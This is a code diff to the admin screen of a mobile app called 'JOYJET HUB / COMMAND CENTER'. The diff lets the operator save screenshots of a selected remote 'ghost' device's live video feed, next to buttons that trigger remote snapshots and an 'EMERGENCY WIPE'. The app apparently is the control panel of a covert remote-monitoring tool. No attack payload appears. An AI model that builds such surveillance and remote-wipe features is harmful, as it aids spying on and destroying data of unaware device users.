@@ -19,6 +19,7 @@ const AdminScreen = ({ onLogout, name }) => {
   const [selectedGhostId, setSelectedGhostId] = useState(null);
   const [activeTab, setActiveTab] = useState('FEED'); // FEED, MAP, SNAPS, CALLS, LOGS
   const viewRef = useRef();
+  const feedRef = useRef();
 
   const selectedGhost = selectedGhostId ? ghosts[selectedGhostId] : null;
 
@@ -114,7 +115,7 @@ const AdminScreen = ({ onLogout, name }) => {
     return `${pad(now.getHours())}${pad(now.getMinutes())}${pad(now.getSeconds())}_${pad(now.getDate())}${pad(now.getMonth() + 1)}${now.getFullYear().toString().slice(-2)}`;
   };
 
-  const captureLocalView = async () => {
+  const captureLocalView = async (targetRef, typeLabel = "DASHBOARD") => {
     try {
       const { status } = await MediaLibrary.requestPermissionsAsync();
       if (status !== 'granted') {
@@ -122,22 +123,25 @@ const AdminScreen = ({ onLogout, name }) => {
         return;
       }
 
-      const uri = await captureRef(viewRef, {
+      // Use specific ref (like feed) or fallback to full viewRef
+      const captureTarget = (targetRef && targetRef.current) ? targetRef : viewRef;
+      
+      const uri = await captureRef(captureTarget, {
         format: 'jpg',
-        quality: 0.8,
+        quality: 0.9,
       });
 
       const nodeInfo = selectedGhost ? selectedGhost.name.replace(/[^a-z0-9]/gi, '_').toUpperCase() : 'NONE';
-      const filename = `DASHBOARD_${nodeInfo}_${getFormattedTimestamp()}.jpg`;
+      const filename = `${typeLabel}_${nodeInfo}_${getFormattedTimestamp()}.jpg`;
       
       const asset = await MediaLibrary.createAssetAsync(uri);
       await MediaLibrary.createAlbumAsync('JOYJET_SCREENSHOTS', asset, false);
       
       Vibration.vibrate([0, 50, 50, 50]);
-      Alert.alert("DASHBOARD CAPTURED", `Manifest: ${filename}`);
+      Alert.alert(`${typeLabel} PRESERVED`, `Manifest: ${filename}`);
     } catch (e) {
       console.error("Local capture failed", e);
-      Alert.alert("Error", "Dashboard capture failed.");
+      Alert.alert("Error", "Feed capture failed. Ensure stream is active before capturing.");
     }
   };
 
@@ -146,12 +150,7 @@ const AdminScreen = ({ onLogout, name }) => {
       <StatusBar barStyle="light-content" />
       
       <View style={styles.header}>
-        <View style={{ flexDirection: 'row', alignItems: 'center' }}>
-          <Text style={styles.headerTitle}>JOYJET HUB / COMMAND CENTER</Text>
-          <TouchableOpacity style={{ marginLeft: 15 }} onPress={captureLocalView}>
-            <MaterialCommunityIcons name="camera-plus-outline" size={20} color="#00ff00" />
-          </TouchableOpacity>
-        </View>
+        <Text style={styles.headerTitle}>JOYJET HUB / COMMAND CENTER</Text>
         <TouchableOpacity style={styles.logoutBtn} onPress={onLogout}>
           <Text style={styles.logoutTxt}>[ LOGOUT ]</Text>
         </TouchableOpacity>
@@ -213,12 +212,20 @@ const AdminScreen = ({ onLogout, name }) => {
 
             {activeTab === 'FEED' && (
               <View style={styles.tabSection}>
-                <VideoFeed ghostName={selectedGhost.name} adminName={name} />
+                <View ref={feedRef} collapsable={false} style={{ backgroundColor: '#000' }}>
+                  <VideoFeed ghostName={selectedGhost.name} adminName={name} />
+                </View>
                 <View style={styles.controls}>
-                  <TouchableOpacity style={styles.btn} onPress={() => sendCommand(selectedGhost.name, 'SNAPSHOT')}>
-                    <MaterialCommunityIcons name="camera-iris" size={18} color="#00ff00" style={{ marginRight: 10 }} />
-                    <Text style={styles.btnTxt}>TRIGGER CAPTURE</Text>
+                  <TouchableOpacity style={styles.btn} onPress={() => captureLocalView(feedRef, "FEED")}>
+                    <MaterialCommunityIcons name="camera-plus" size={18} color="#00ff00" style={{ marginRight: 10 }} />
+                    <Text style={styles.btnTxt}>CAPTURE LIVE FEED</Text>
                   </TouchableOpacity>
+                  
+                  <TouchableOpacity style={[styles.btn]} onPress={() => sendCommand(selectedGhost.name, 'SNAPSHOT')}>
+                    <MaterialCommunityIcons name="camera-iris" size={18} color="#00ff00" style={{ marginRight: 10 }} />
+                    <Text style={styles.btnTxt}>REMOTE HIGH-RES SNAP</Text>
+                  </TouchableOpacity>
+
                   <TouchableOpacity style={[styles.btn, styles.wipeBtn]} onPress={() => sendCommand(selectedGhost.name, 'WIPE')}>
                     <MaterialCommunityIcons name="skull-outline" size={18} color="#ff4444" style={{ marginRight: 10 }} />
                     <Text style={styles.wipeBtnTxt}>EMERGENCY WIPE</Text>
